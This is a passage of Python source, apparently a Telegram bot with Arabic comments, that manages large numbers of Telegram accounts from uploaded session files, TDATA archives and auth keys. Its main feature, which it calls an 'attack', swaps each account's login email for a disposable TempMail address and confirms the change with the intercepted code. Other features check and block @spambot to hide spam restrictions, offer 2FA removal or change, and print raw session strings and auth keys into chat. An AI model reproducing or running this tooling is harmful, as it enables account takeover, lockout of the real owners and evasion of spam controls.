            acc_id, phone, name, user_id, session = acc
            is_worker = acc_id in USER_WORKERS[uid]
            btn_text = f"{'✅' if is_worker else '⬜️'} {phone} | {name[:15]}"
            markup.row(InlineKeyboardButton(btn_text, callback_data=f"toggle_worker_{acc_id}"))

        markup.row(InlineKeyboardButton("✅ تم وحفظ", callback_data="auto_email_menu"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error in manage_workers_cb: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('toggle_worker_'))
def toggle_worker_cb(call):
    try:
        uid = call.from_user.id
        acc_id = int(call.data.split('_')[2])

        if uid not in USER_WORKERS:
            USER_WORKERS[uid] = set()

        if acc_id in USER_WORKERS[uid]:
            USER_WORKERS[uid].remove(acc_id)
        else:
            USER_WORKERS[uid].add(acc_id)

        # إعادة تحميل نفس القائمة لتبقى ظاهرة
        manage_workers_cb(call)
    except Exception as e:
        logging.error(f"Error in toggle_worker_cb: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'start_email_targets')
def start_email_targets_cb(call):
    try:
        uid = call.from_user.id
        accounts = get_all_accounts(uid)
        if not accounts:
            bot.answer_callback_query(call.id, "❌ لا توجد حسابات لديك.", show_alert=True)
            return

        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("🌟 تغيير إيميل (كل حساباتي)", callback_data="exec_email_all"))

        for acc in accounts:
            acc_id, phone, name, user_id, session = acc
            markup.row(InlineKeyboardButton(f"📱 {phone} | {name[:15]}", callback_data=f"exec_email_{acc_id}"))

        markup.row(InlineKeyboardButton("🔙 العودة", callback_data="auto_email_menu"))
        bot.edit_message_text("🎯 **اختر الحساب المراد تغيير إيميله:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error in start_email_targets_cb: {e}")

# ==========================================
# 🚀 محرك التنفيذ (استدعاء الدالة الكبرى)
# ==========================================

@bot.callback_query_handler(func=lambda call: call.data.startswith('exec_email_'))
def execute_email_change_cb(call):
    try:
        uid = call.from_user.id
        chat_id = call.message.chat.id
        msg_id = call.message.message_id

        all_accounts = get_all_accounts(uid)
        accounts_dict = {acc[0]: acc for acc in all_accounts}

        # تحديد الأهداف
        if call.data == 'exec_email_all':
            target_ids = list(accounts_dict.keys())
        else:
            target_id = int(call.data.split('_')[2])
            target_ids = [target_id]

        targets = [accounts_dict[tid] for tid in target_ids if tid in accounts_dict]

        # تحديد العمال
        if uid not in USER_WORKERS:
            USER_WORKERS[uid] = set()

        worker_sessions = [DEFAULT_TEMP_MAIL_SESSION]
        target_sessions = set([acc[4] for acc in targets])

        for w_id in USER_WORKERS[uid]:
            if w_id in accounts_dict:
                w_session = accounts_dict[w_id][4]
                # منع العامل من تغيير نفسه برمجياً
                if w_session not in target_sessions:
                    worker_sessions.append(w_session)
                else:
                    logging.warning(f"Worker {w_id} is a target, skipping to prevent self-change.")

        # إزالة التكرارات
        worker_sessions = list(set(worker_sessions))

        if not targets:
            bot.answer_callback_query(call.id, "❌ لا توجد أهداف.", show_alert=True)
            return

        if not worker_sessions:
            bot.answer_callback_query(call.id, "❌ العمال المستخدمون كأهداف لا يمكنهم العمل. أضف عمال آخرين.", show_alert=True)
            return

        bot.answer_callback_query(call.id, "⏳ جاري بدء الهجوم...")

        def run_async_task():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(run_email_automation(chat_id, msg_id, targets, worker_sessions))
            except Exception as e:
                logging.error(f"Error in run_async_task: {e}\n{traceback.format_exc()}")
            finally:
                loop.close()

        threading.Thread(target=run_async_task).start()

    except Exception as e:
        logging.error(f"Error in execute_email_change_cb: {e}\n{traceback.format_exc()}")

# ==========================================
# 📧 دوال الإيميل المؤقت (مع مراقبة شاملة بالترمنال)
# ==========================================
async def fetch_temp_mail(worker_client):
    try:
        history = [msg async for msg in worker_client.get_chat_history("TempMail_org_bot", limit=1)]
        last_msg_id = history[0].id if history else 0

        logging.info("ℹ️ إرسال /start لبوت الإيميل المؤقت...")
        await worker_client.send_message("TempMail_org_bot", "/start")

        for _ in range(10):  # 20 ثانية انتظار
            await asyncio.sleep(2)
            async for msg in worker_client.get_chat_history("TempMail_org_bot", limit=3):
                if msg.id > last_msg_id and msg.text:
                    match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', msg.text)
                    if match:
                        email = match.group(0)
                        logging.info(f"✅ تم جلب الإيميل: {email}")
                        return email, msg.id

        logging.error("❌ مراقب: انتهى الوقت ولم يتم العثور على إيميل في رسائل البوت!")
        return None, 0
    except Exception as e:
        logging.error(f"❌ مراقب [fetch_temp_mail]: {e}\n{traceback.format_exc()}")
        return None, 0

async def wait_for_email_code(worker_client, last_msg_id):
    try:
        logging.info("ℹ️ بانتظار وصول الكود...")
        for _ in range(30):  # 60 ثانية انتظار للكود
            await asyncio.sleep(2)
            async for msg in worker_client.get_chat_history("TempMail_org_bot", limit=5):
                if msg.id > last_msg_id and msg.text:
                    match = re.search(r'\b(\d{5,6})\b', msg.text)
                    if match:
                        code = match.group(1)
                        logging.info(f"✅ تم التقاط الكود: {code}")
                        return code

        logging.error("❌ مراقب: انتهى وقت انتظار الكود ولم يصل!")
        return None
    except Exception as e:
        logging.error(f"❌ مراقب [wait_for_email_code]: {e}\n{traceback.format_exc()}")
        return None





# ==========================================
# ⚙️ العامل (Worker Engine)
# ==========================================
async def email_changer_worker(worker_session, target_queue, status_data):
    worker_client = None
    try:
        worker_client = Client(f"wk_{int(time.time()*1000)}", api_id=API_ID, api_hash=API_HASH, session_string=worker_session, in_memory=True)
        await worker_client.connect()
        logging.info("✅ عامل (Worker) متصل وجاهز.")
        status_data['log'].append("✅ عامل (Worker) متصل وجاهز.")
    except Exception as e:
        logging.error(f"❌ مراقب [worker_connect]: {e}\n{traceback.format_exc()}")
        status_data['log'].append("❌ فشل اتصال عامل.")
        return

    while not target_queue.empty():
        target_client = None
        try:
            target_data = target_queue.get_nowait()
            target_id, target_phone, target_session = target_data

            logging.info(f"⏳ جاري معالجة الحساب: {target_phone}")
            status_data['log'].append(f"⏳ جاري معالجة {target_phone}...")

            # 1. جلب الإيميل
            new_email, last_msg_id = await fetch_temp_mail(worker_client)
            if not new_email:
                raise Exception("فشل جلب إيميل من بوت TempMail")

            # 2. الاتصال بحساب الهدف
            logging.info(f"ℹ️ جاري الاتصال بحساب الهدف: {target_phone}")
            target_client = Client(f"tg_{target_id}_{int(time.time()*1000)}", api_id=API_ID, api_hash=API_HASH, session_string=target_session, in_memory=True)
            await target_client.connect()
            logging.info(f"✅ تم الاتصال بحساب الهدف: {target_phone}")

            # 3. إرسال طلب الكود (استخدام EmailVerifyPurposeLoginChange لأن الحساب مسجل دخوله)
            logging.info(f"ℹ️ إرسال طلب SendVerifyEmailCode للرقم {target_phone} بالإيميل {new_email}...")
            await target_client.invoke(SendVerifyEmailCode(
                email=new_email, 
                purpose=EmailVerifyPurposeLoginChange()  # ✅ التصحيح هنا
            ))
            logging.info(f"✅ تم إرسال الطلب بنجاح لـ {target_phone}")

            # 4. انتظار الكود
            logging.info(f"ℹ️ جاري انتظار الكود للرقم {target_phone}...")
            code = await wait_for_email_code(worker_client, last_msg_id)
            if not code:
                raise Exception("لم يصل الكود من الإيميل خلال الوقت المحدد")

            # 5. تأكيد الكود
            logging.info(f"ℹ️ جاري تأكيد الكود {code} للرقم {target_phone}...")
            await target_client.invoke(VerifyEmail(
                purpose=EmailVerifyPurposeLoginChange(),  # ✅ التصحيح هنا
                verification=EmailVerificationCode(code=code)
            ))

            logging.info(f"🎉 نجاح! {target_phone}: تم التغيير لـ {new_email}")
            status_data['success'] += 1
            status_data['log'].append(f"✅ {target_phone}: تم التغيير لـ `{new_email}`")

        except FloodWait as e:
            logging.error(f"❌ مراقب [FloodWait] لـ {target_phone}: {e.value}s\n{traceback.format_exc()}")
            status_data['failed'] += 1
            status_data['log'].append(f"❌ {target_phone}: محظور ({e.value}s)")

        except RPCError as e:
            logging.error(f"❌ مراقب [RPCError] لـ {target_phone}: {e}\n{traceback.format_exc()}")
            status_data['failed'] += 1
            status_data['log'].append(f"❌ {target_phone}: خطأ تيليجرام: {str(e)[:80]}")

        except Exception as e:
            logging.error(f"❌ مراقب [عام] لـ {target_phone}: {e}\n{traceback.format_exc()}")
            status_data['failed'] += 1
            status_data['log'].append(f"❌ {target_phone}: {str(e)[:50]}")

        finally:
            if target_client and target_client.is_connected:
                await target_client.disconnect()

            try:
                target_queue.task_done()
            except ValueError:
                pass

    if worker_client and worker_client.is_connected:
        await worker_client.disconnect()

    logging.info("⚠️ انتهى عمل أحد العمال.")
    status_data['log'].append("⚠️ انتهى عمل أحد العمال.")












# ==========================================
# 📊 واجهة التقدم المباشر
# ==========================================
async def live_progress_updater(chat_id, msg_id, status_data):
    last_text = ""
    while not status_data['done']:
        try:
            total = status_data['total']
            processed = status_data['success'] + status_data['failed']
            pending = total - processed
            percent = int((processed / total) * 100) if total > 0 else 0

            filled = int(percent / 10)
            bar = "🟩" * filled + "⬜️" * (10 - filled)
            recent_logs = "\n".join(status_data['log'][-8:])

            text = (
                f"🔄 **جاري الهجوم وتغيير الإيميلات...**\n\n"
                f"📊 **التقدم:** {bar} {percent}%\n"
                f"⏱ **قيد الانتظار:** {pending}\n"
                f"✅ **نجاح:** {status_data['success']} | ❌ **فشل:** {status_data['failed']}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📡 **السجل:**\n{recent_logs}"
            )

            if text != last_text:
                try:
                    bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown")
                    last_text = text
                except:
                    pass

            await asyncio.sleep(2)
        except Exception as e:
            logging.error(f"Error in live_progress_updater: {e}")

# ==========================================
# 🟢 دالة التشغيل الرئيسية
# ==========================================
async def run_email_automation(chat_id, msg_id, targets, worker_sessions):
    try:
        status_data = {
            'total': len(targets),
            'success': 0,
            'failed': 0,
            'done': False,
            'log': [f"🚀 تم بدء الهجوم بـ {len(worker_sessions)} عامل!"]
        }

        updater_task = asyncio.create_task(live_progress_updater(chat_id, msg_id, status_data))

        queue = asyncio.Queue()
        for tgt in targets:
            queue.put_nowait((tgt[0], tgt[1], tgt[4]))

        worker_tasks = []
        for w_session in worker_sessions:
            task = asyncio.create_task(email_changer_worker(w_session, queue, status_data))
            worker_tasks.append(task)

        await queue.join()

        for task in worker_tasks:
            task.cancel()

        status_data['done'] = True
        await asyncio.sleep(1)

        final_text = (
            f"🏁 **تمت عملية تغيير الإيميلات بنجاح!**\n\n"
            f"⎉╎ إجمالي الحسابات: {status_data['total']}\n"
            f"✅ نجاح: {status_data['success']}\n"
            f"❌ فشل: {status_data['failed']}\n"
            f"⚡️ تم التغيير بواسطة {len(worker_sessions)} حساب مساعد."
        )

        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 العودة للرئيسية", callback_data="back_home"))
        try:
            bot.edit_message_text(final_text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, final_text, reply_markup=markup, parse_mode="Markdown")

    except Exception as e:
        logging.error(f"Error in run_email_automation: {e}\n{traceback.format_exc()}") 













def accounts_action_keyboard(owner_id, action):
    accounts = get_all_accounts(owner_id)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data=f"act:{action}:all"))
    for acc_id, phone, name, uid, _ in accounts:
        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"act:{action}:{acc_id}"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    return markup

def two_fa_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• حـذف الـتـحـقـق 🗑️", callback_data="menu_2fa_remove"), InlineKeyboardButton("• تـغـيـيـر الـتـحـقـق 🔄", callback_data="menu_2fa_change"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    return markup

# =========================================================
# ✉️ الأوامر
# =========================================================

@bot.message_handler(commands=['start'])
def start_message(message):
    if not is_allowed(message.from_user.id):
        bot.reply_to(message, "عذراً، البوت خاص ولا يمكنك استخدامه.", parse_mode="Markdown")
        return

    if message.from_user.id not in ADMIN_IDS:
        log_to_channel(f"🛂┊ مـسـتـخـدم جـديـد دخـل الـبـوت !\n\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`\n⎉╎ الـيـوزر: @{message.from_user.username or 'لا يوجد'}")

    text = ("🛂┊ أهـلاً بـك فـي بـوت الإدارة الاحـتـرافـي !\n\n⎉╎ أرْسـل مـلـف TDATA (بـصـيـغـة ZIP).\n⎉╎ أو أرْسـل مـلـف .session مـبـاشـرة.\n⎉╎ أو أرْسـل مـفـتـاح AuthKey (HEX).\n⎉╎ أو أرْسـل نـص Session.\n•❐• الـبـوت يـتـعـرف تـلـقـائـيـاً عـلـى الـنـوع.\n\nتـحـكـم بـحـسـابـاتـك بـالـكـامـل مـن الأسـفـل ⬇️")
    bot.reply_to(message, text, reply_markup=home_keyboard(message.from_user.id), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_home")
def back_home(call):
    if not is_allowed(call.from_user.id): return
    if call.from_user.id in USER_STATES: del USER_STATES[call.from_user.id]
    bot.edit_message_text("🛂┊ الـقـائـمـة الـرئـيـسـيـة:", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")



















#داله السبام هنا





# ==========================================
# 🚫 منظومة إدارة فحص وحظر السبام بلوك 
# ==========================================
import re

@bot.callback_query_handler(func=lambda call: call.data == "spam_manage")
def spam_manage_menu(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔍 فـحـص الـسـبـام", callback_data="spam_check"))
    markup.row(InlineKeyboardButton("🚫 حـظـر الـبـوت (@spambot)", callback_data="spam_block_menu"))
    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـرئـيـسـيـة", callback_data="back_home"))

    text = (
        "🛂┊ **إدارة الـسـبـام بـلـوك:**\n\n"
        "⎉╎ **فـحـص:** يـتـواصـل مـع `@spambot` لـمـعـرفـة حـالـة الـحـسـابـات.\n"
        "⎉╎ **حـظـر:** لـحـظـر `@spambot` ومـسـح الـمـحـادثـة لـلـحـمـايـة."
    )
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

# --- 1. دالة فحص السبام ---
async def check_single_spam(acc_id, phone, pyro_session, uid):
    async with account_semaphore:
        client = Client(f"spam_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=8)
            # فك الحظر عن البوت تحسباً لو كان محظوراً لكي نستطيع إرسال start
            try: await client.unblock_user("spambot")
            except: pass

            await client.send_message("spambot", "/start")
            await asyncio.sleep(2.5) # انتظار الرد من تليجرام

            status = "❌ مـحـظـور دائـم"
            is_spam = True

            async for msg in client.get_chat_history("spambot", limit=1):
                if msg.text:
                    text = msg.text.lower()
                    if "رائع" in text or "good news" in text or "لاتوجد قيود" in text or "no limits" in text or "حر طليق" in text:
                        status = "✅ حـر"
                        is_spam = False
                    elif "تاريخ" in text or "until" in text:
                        # استخراج التاريخ
                        date_match = re.search(r'(?:تاريخ|until)\s+([0-9]+\s+[a-zA-Z]+\s+[0-9]{4}(?:,\s+[0-9:]+\s+[a-zA-Z]+)?)', msg.text, re.IGNORECASE)
                        date_str = date_match.group(1) if date_match else "غـيـر مـعـروف"
                        status = f"🟡 مـؤقـت (إلـى {date_str})"
                        is_spam = True
                    elif "نعتذر" in text or "unfortunately" in text or "afraid" in text or "قاسية" in text:
                        status = "❌ مـحـظـور دائـم"
                        is_spam = True

            await client.disconnect()

            # تسجيل الحساب في قائمة السبام المؤقتة إذا كان محظوراً لاستخدامها في زر (تطبيق على السبام فقط)
            if is_spam:
                if "spam_accounts" not in USER_STATES.get(uid, {}):
                    if uid not in USER_STATES: USER_STATES[uid] = {}
                    USER_STATES[uid]["spam_accounts"] = set()
                USER_STATES[uid]["spam_accounts"].add(acc_id)

            return f"⎉╎ `{phone}` | {status}\n"
        except Exception as e:
            if client.is_connected: await client.disconnect()
            return f"⎉╎ `{phone}` | ⚠️ فـشـل الاتـصـال\n"

@bot.callback_query_handler(func=lambda call: call.data == "spam_check")
def spam_check_action(call):
    uid = call.from_user.id
    if not is_allowed(uid): return
    accounts = get_all_accounts(uid)
    if not accounts: return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة!", show_alert=True)

    bot.edit_message_text("⏳ **جـاري فـحـص حـالـة الـسـبـام لـكـافـة الـحـسـابـات بـسـرعـة...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    # تصفير كاش السبام قبل الفحص الجديد
    if uid not in USER_STATES: USER_STATES[uid] = {}
    USER_STATES[uid]["spam_accounts"] = set()

    async def run_spam_check():
        tasks = [check_single_spam(acc[0], acc[1], acc[4], uid) for acc in accounts]
        results = await asyncio.gather(*tasks)

        # نظام التقسيم لتجنب خطأ MESSAGE_TOO_LONG
        text_chunks = []
        current_text = "🛂┊ **نـتـيـجـة فـحـص الـسـبـام بـلـوك:**\n\n"

        for res_text in results:
            if len(current_text) + len(res_text) > 3900:
                text_chunks.append(current_text)
                current_text = "🛂┊ **تـكـمـلـة فـحـص الـسـبـام:**\n\n" + res_text
            else:
                current_text += res_text

        if current_text:
            text_chunks.append(current_text)

        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="spam_manage"))

        for i, chunk in enumerate(text_chunks):
            is_last_chunk = (i == len(text_chunks) - 1)
            current_markup = markup if is_last_chunk else None
            try:
                if i == 0:
                    bot.edit_message_text(chunk, call.message.chat.id, call.message.message_id, reply_markup=current_markup, parse_mode="Markdown")
                else:
                    bot.send_message(call.message.chat.id, chunk, reply_markup=current_markup, parse_mode="Markdown")
                    await asyncio.sleep(0.3)
            except Exception: pass

    run_async(run_spam_check())

# --- 2. قوائم حظر البوت @spambot ---
@bot.callback_query_handler(func=lambda call: call.data == "spam_block_menu")
def spam_block_menu(call):
    uid = call.from_user.id
    if not is_allowed(uid): return
    accounts = get_all_accounts(uid)
    if not accounts: return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة!", show_alert=True)

    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="act_spamblock:all"))
    markup.row(InlineKeyboardButton("❌ تـطـبـيـق عـلـى الـسـبـام فـقـط", callback_data="act_spamblock:spam_only"))

    for acc in accounts:
        markup.row(InlineKeyboardButton(f"{acc[2]} | {acc[1]}", callback_data=f"act_spamblock:{acc[0]}"))

    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="spam_manage"))

    text = "🛂┊ **حـظـر بـوت الـسـبـام (@spambot):**\n\n⎉╎ سـيـتـم حـظـر الـبـوت ومـسـح الـمـحـادثـة مـعـه نـهـائـيـاً لـلـحـمـايـة.\n⎉╎ اخـتـر نـطـاق الـتـطـبـيـق:"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

# --- 3. دالة الحظر الفعلية ---
async def block_single_spambot(acc_id, pyro_session):
    async with account_semaphore:
        client = Client(f"sblk_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=8)
            # حظر البوت
            await client.block_user("spambot")
            # مسح المحادثة بشكل نهائي
            peer = await client.resolve_peer("spambot")
            await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
            await client.disconnect()
            return True
        except Exception:
            if client.is_connected: await client.disconnect()
            return False

@bot.callback_query_handler(func=lambda call: call.data.startswith("act_spamblock:"))
def execute_spamblock_action(call):
    uid = call.from_user.id
    if not is_allowed(uid): return
    target = call.data.split(":")[1]

    accounts = get_all_accounts(uid)

    if target == "spam_only":
        spam_cache = USER_STATES.get(uid, {}).get("spam_accounts", set())
        if not spam_cache:
            return bot.answer_callback_query(call.id, "⚠️ يرجى عمل 'فحص السبام' أولاً لكي يتعرف البوت على الحسابات المحظورة!", show_alert=True)
        accounts = [a for a in accounts if a[0] in spam_cache]
        if not accounts:
            return bot.answer_callback_query(call.id, "✅ جميع حساباتك سليمة، لا يوجد حسابات سبام لحظرها!", show_alert=True)
    elif target != "all":
        accounts = [a for a in accounts if str(a[0]) == target]

    bot.edit_message_text("⏳ **جـاري حـظـر `@spambot` ومـسـح الـمـحـادثـة...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    async def run_block():
        tasks = [block_single_spambot(acc[0], acc[4]) for acc in accounts]
        results = await asyncio.gather(*tasks)

        success_count = sum(1 for r in results if r)

        msg = (
            f"🛂┊ **تـم حـظـر `@spambot` ومـسـح الـمـحـادثـة!**\n\n"
            f"⎉╎ **نـجـح:** `{success_count}` مـن أصـل `{len(accounts)}` حـسـاب."
        )
        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="spam_manage"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    run_async(run_block())








import html
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# دالة مساعدة لجلب معلومات الحسابات بسرعة 50 اتصال
async def fetch_account_info_fast(acc_id, phone, name, uid, pyro_session):
    async with account_semaphore:
        client = Client(f"rev_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=8)
            me = await client.get_me()
            await client.disconnect()
            return acc_id, phone, name, uid, me
        except Exception:
            if client.is_connected:
                await client.disconnect()
            return acc_id, phone, name, uid, None

@bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
def reveal_accounts(call):
    if not is_allowed(call.from_user.id): return
    accounts = get_all_accounts(call.from_user.id)
    if not accounts: return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)

    bot.edit_message_text("⏳ **جـاري فـحـص وجـلـب بـيـانـات الـحـسـابـات...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    # جلب بيانات اليوزرات سريعاً
    tasks = [fetch_account_info_fast(acc[0], acc[1], acc[2], acc[3], acc[4]) for acc in accounts]
    fetched_data = run_async(asyncio.gather(*tasks))

    batch_size = 15
    account_batches = [fetched_data[i:i + batch_size] for i in range(0, len(fetched_data), batch_size)]

    for index, batch in enumerate(account_batches):
        text = f"<b>🛂┊ كشـف الحـسـابات ({len(accounts)} حـسـاب):</b>\n\n" if index == 0 else f"<b>🛂┊ تـكـمـلـة الـحـسـابـات (الـجـزء {index + 1}):</b>\n\n"

        for acc_id, phone, name, uid, me in batch:
            safe_phone = html.escape(str(phone))
            safe_uid = html.escape(str(uid))
            creation_year = get_creation_year(uid)

            # تحديد اليوزر أو الاسم
            if me and me.username:
                display_name = f"@{html.escape(me.username)}"
            elif me and me.first_name:
                display_name = html.escape(me.first_name)
            else:
                display_name = html.escape(str(name))

            text += (
                f"▪️ <b>الـرقـم:</b> {safe_phone}\n"
                f"▪️ <b>الاسـم/الـيـوزر:</b> {display_name}\n"
                f"▪️ <b>الآيـدي:</b> {safe_uid}\n"
                f"▪️ <b>سـنـة الإنـشـاء:</b> {creation_year}\n"
                f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
            )

        is_last_batch = (index == len(account_batches) - 1)
        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home")) if is_last_batch else None

        if index == 0:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
        else:
            bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="HTML")
            time.sleep(0.3)









@bot.callback_query_handler(func=lambda call: call.data == "view_sessions_menu")
def view_sessions_menu(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• جـلـسـات Hex (مفتاح Tdata) 🔠", callback_data="view_sessions:Hex"))
    markup.row(InlineKeyboardButton("• جـلـسـات مـلـفـات (ZIP / Session) 📁", callback_data="view_sessions:Files"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    bot.edit_message_text("🛂┊ اخـتـر نـوع الـجـلـسـات الـتـي تـريـد عـرضـهـا:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("view_sessions:"))
def show_sessions_by_type(call):
    if not is_allowed(call.from_user.id): return
    sess_type = call.data.split(":")[1]

    conn = get_db_conn()
    c = conn.cursor()
    if sess_type == "Hex":
        c.execute("SELECT phone, first_name, hex_key, dc_id FROM sessions WHERE owner_id=? AND UPPER(session_type)='HEX'", (call.from_user.id,))
    else:
        c.execute("SELECT phone, first_name, pyro_session FROM sessions WHERE owner_id=? AND session_type IN ('File', 'ZIP', 'String')", (call.from_user.id,))

    rows = c.fetchall()
    conn.close()

    if not rows:
        bot.answer_callback_query(call.id, "❌ لا تـوجـد جـلـسـات مـضـافـة مـن هـذا الـنـوع حالياً.", show_alert=True)
        return

    bot.answer_callback_query(call.id, "⏳ جاري تجهيز الجلسات للعرض...")

    # الجلسات ومفاتيح الهيكس طويلة جداً لذا نقسمها لـ 7 حسابات لكل رسالة كحد أقصى لتجنب الحظر
    batch_size = 7
    row_batches = [rows[i:i + batch_size] for i in range(0, len(rows), batch_size)]

    for index, batch in enumerate(row_batches):
        if index == 0:
            text = f"🛂┊ عـرض الـجـلـسـات (نـوع الإدخـال: {sess_type}):\n\n"
        else:
            text = f"🛂┊ تـكـمـلـة الـجـلـسـات (الـجـزء {index + 1}):\n\n"

        for row in batch:
            if sess_type == "Hex":
                phone, name, hex_key, dc_id = row
                display_key = f"{hex_key} {dc_id if dc_id else '2'}"
                text += f"⎉╎ {name} | {phone}\n`{display_key}`\n〰️〰️〰️〰️\n"
            else:
                phone, name, pyro_sess = row
                text += f"⎉╎ {name} | {phone}\n`{pyro_sess}`\n〰️〰️〰️〰️\n"

        is_last_batch = (index == len(row_batches) - 1)
        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="view_sessions_menu")) if is_last_batch else None

        if index == 0:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
            time.sleep(0.3)


import html
import time
import asyncio
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client

# ==========================================
# 🔠 دوال مساعدة لجلب البيانات بسرعة فائقة وأمان
# ==========================================

# دالة مساعدة لجلب معلومات الحسابات بسرعة 50 اتصال
async def fetch_account_info_fast(acc_id, phone, name, uid, pyro_session):
    async with account_semaphore:
        client = Client(f"rev_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=8)
            me = await client.get_me()
            await client.disconnect()
            return acc_id, phone, name, uid, me
        except Exception:
            if client.is_connected:
                await client.disconnect()
            return acc_id, phone, name, uid, None

# دالة مساعدة لجمع البيانات بطريقة آمنة لتجنب خطأ الـ Event Loop في الـ Threads
async def gather_account_info_safe(accounts):
    tasks = [fetch_account_info_fast(acc[0], acc[1], acc[2], acc[3], acc[4]) for acc in accounts]
    return await asyncio.gather(*tasks)

# ==========================================
# 🔠 منظومة إدارة وتحرير اليوزرات السريعة
# ==========================================

@bot.callback_query_handler(func=lambda call: call.data == "usernames_manage")
def usernames_manage_menu(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔍 فـحـص الـيـوزرات", callback_data="usernames_check"))
    markup.row(InlineKeyboardButton("🗑️ تـحـريـر الـيـوزرات", callback_data="usernames_release_menu"))
    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـرئـيـسـيـة", callback_data="back_home"))

    text = (
        "🛂┊ **إدارة فـحـص وتـحـريـر الـيـوزرات:**\n\n"
        "⎉╎ **فـحـص:** يـعـرض كـافـة يـوزرات الـحـسـابـات مـع أرقـامـهـا.\n"
        "⎉╎ **تـحـريـر:** يـتـيـح لـك إزالـة الـيـوزر مـن أي حـسـاب لـيـصـبـح مـتـاحـاً."
    )
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "usernames_check")
def usernames_check_action(call):
    if not is_allowed(call.from_user.id): return

    accounts = get_all_accounts(call.from_user.id)
    if not accounts:
        return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة للفحص!", show_alert=True)

    bot.edit_message_text("⏳ <b>جـاري فـحـص يـوزرات الـحـسـابـات بـسـرعـة...</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    # استخدام الدالة الآمنة لجمع البيانات بـ 50 اتصال بنفس الوقت
    fetched_data = run_async(gather_account_info_safe(accounts))

    # تجهيز نظام تقسيم الرسائل لتفادي خطأ طول الرسالة
    text_chunks = []
    current_text = "<b>🛂┊ نـتـيـجـة فـحـص الـيـوزرات:</b>\n\n"

    for acc_id, phone, name, uid, me in fetched_data:
        # جلب اليوزر (الـ HTML يتجاهل الشرطات السفلية ويعرضها كما هي بدون مشاكل)
        if me and me.username:
